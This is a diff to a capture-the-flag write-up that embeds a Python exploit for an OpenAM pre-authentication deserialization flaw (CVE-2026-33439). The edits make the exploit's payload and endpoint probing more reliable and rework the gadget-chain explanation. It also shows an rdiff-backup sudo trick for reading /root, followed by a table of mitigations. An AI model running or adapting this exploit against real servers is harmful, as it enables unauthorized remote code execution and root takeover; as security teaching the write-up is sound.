@@ -44,6 +44,7 @@ the stock exploit runs unchanged:
 
 ```python
 #!/usr/bin/env python3
+"""
 CVE-2026-33439 - OpenAM Pre-Auth RCE via jato.clientSession Deserialization
 
 Author    : TheMalwareGuardian
@@ -69,7 +70,8 @@ Gadget Chain (uses only classes bundled in the OpenAM WAR):
                                         → Runtime.getRuntime().exec(cmd)
 
 Requirements:
-        JDK 21 (javac)            - must match OpenAM JVM version
+        JDK 11+ (javac)           - EvilTranslet is built with --release 11;
+                                    PayloadBuilder only runs locally
         openam-core-16.0.5.jar    - Column, PropertyUtils
         xalan-2.7.3.jar           - TemplatesImpl, TransformerFactoryImpl
         serializer-2.7.3.jar      - SerializationHandler (EvilTranslet interface)
@@ -149,7 +151,9 @@ public class EvilTranslet extends AbstractTranslet {{
         static {{
                 try {{
                         Runtime.getRuntime().exec({cmd_array});
-                }} catch (Exception ignored) {{}}
+                }} catch (Exception e) {{
+                        e.printStackTrace();
+                }}
         }}
         public void transform(DOM d, SerializationHandler[] h) throws TransletException {{}}
         public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) throws TransletException {{}}
@@ -365,7 +369,9 @@ def probe_endpoint(base_url: str, endpoint: str, session: requests.Session) -> b
         """
         Check whether a JATO ViewBean endpoint is reachable pre-authentication.
 
-        HTTP 200 indicates the endpoint renders <jato:form> tags and will deserialize jato.clientSession during JSP processing.
+        Any status other than 404 means the route exists: a rendered <jato:form>
+        returns 200, and a failed probe deserialization returns an error page.
+        HEAD is unreliable here, since many front ends answer 405/501 to it.
 
         Args:
                 base_url : OpenAM base URL.
@@ -373,14 +379,14 @@ def probe_endpoint(base_url: str, endpoint: str, session: requests.Session) -> b
                 session  : Requests session.
 
         Returns:
-                True if HTTP 200, False otherwise.
+                True if the endpoint is not absent, False otherwise.
         """
         url = f"{base_url.rstrip('/')}{endpoint}"
         try:
-                resp = session.head(
+                resp = session.get(
                         url, params={"jato.clientSession": "probe"}, timeout=10, verify=False
                 )
-                ok = resp.status_code == 200
+                ok = resp.status_code != 404
                 color = "\033[92m" if ok else "\033[91m"
                 print(f"  [{color}{'OK' if ok else 'NO'}\033[0m] {url}  →  HTTP {resp.status_code}")
                 return ok
@@ -574,19 +580,23 @@ python3 exploit_cve_2026_33439.py \
     --method GET
 ```
 
+`GET` mirrors the tested invocation; switch to `--method POST` if a proxy or
+front end rejects the URL length.
+
 Result — RCE as `openam`:
 
 ```
 uid=999(openam) gid=999(openam) groups=999(openam)
 ```
 
-**Why it works:** the chain is `PriorityQueue` → `Table$Column$ColumnComparator`
-`compare()` → `PropertyUtils.getRowList()` (a `TemplatesImpl` masquerades as the
-row list) → `outputProperties` → `TemplatesImpl.newTransformer()` compiles and
-executes the embedded `EvilTranslet` (extends `AbstractTranslet`, code in its
-constructor / static initializer). The translet is built client-side with
-`--release 11`, so `TransletClassLoader` has no module-access problem on the
-target JVM.
+**Why it works:** `PriorityQueue.readObject()` heapifies, which calls
+`Column$ColumnComparator.compare()` → `Column.getTable().isSortedAscending()`
+(a `Table` must be attached, hence `column.setTable(table)`) →
+`Column.getProperty()` → `PropertyUtils.getObjectPropertyValue(o1,
+"outputProperties")` → `TemplatesImpl.getOutputProperties()`, which compiles
+`_bytecodes` and runs the `EvilTranslet` static initializer. The translet is
+built client-side with `--release 11`, so `TransletClassLoader` has no
+module-access problem on the target JVM.
 
 ---
 
@@ -646,7 +656,7 @@ rdiff-backup --remote-schema \
   backup /::/root /tmp/rootbak
 
 cat /tmp/rootbak/flag.txt
-# NCTF{}
+# NCTF{...}
 ```
 
 The client process runs `sudo rdiff-backup --server ... --restrict-path /::/root`
@@ -661,5 +671,6 @@ starting with it (`/root/flag.txt`) — as a valid "restricted" root.
 |-------|-----------|-----|
 | Foothold | `jato.clientSession` deserialized with a bare `ObjectInputStream` | class whitelist or signed sessions (the CVE-2021-35464 fix, applied to `jato.pageSession` only, must be applied to `jato.clientSession` too) |
 | Lateral | world-readable app config + same password in a plaintext DB | per-service secrets, rotate, no cred reuse between DB and ssh |
-| Privesc | `sudo` snippet ends in `*` and permits a duplicate `--restrict-path` | drop the trailing `*`; disallow repeated restrict options; use a non-overridable config 
+| Privesc | `sudo` snippet ends in `*` and permits a duplicate `--restrict-path` | drop the trailing `*`; disallow repeated restrict options; use a non-overridable config |
+
 {% endraw %}
